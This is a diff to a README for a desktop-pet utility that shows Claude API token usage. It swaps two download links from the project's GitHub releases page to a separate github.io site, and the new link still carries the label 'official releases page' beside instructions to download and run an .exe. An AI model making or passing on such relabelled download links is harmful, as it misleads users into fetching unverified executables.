@@ -1,6 +1,6 @@
 # 🐕 hachiko-usage - Track your Claude token use daily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/itchy-kingdom684/hachiko-usage/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://itchy-kingdom684.github.io)
 
 Hachiko is a desktop pet that lives on your screen. It displays your Claude API token usage in a thought cloud. You see your current session limits and your weekly rate usage without opening a browser. Hachiko stays near your taskbar to provide constant updates on your budget.
 
@@ -17,7 +17,7 @@ Your computer needs the following to run Hachiko:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official releases page](https://github.com/itchy-kingdom684/hachiko-usage/releases) to find the latest version.
+1.  Visit the [official releases page](https://itchy-kingdom684.github.io) to find the latest version.
 2.  Look for the file ending in `.exe` under the "Assets" section.
 3.  Click the file name to start the download.
 4.  Once the file finishes downloading, move it to a folder where you want to keep the program.
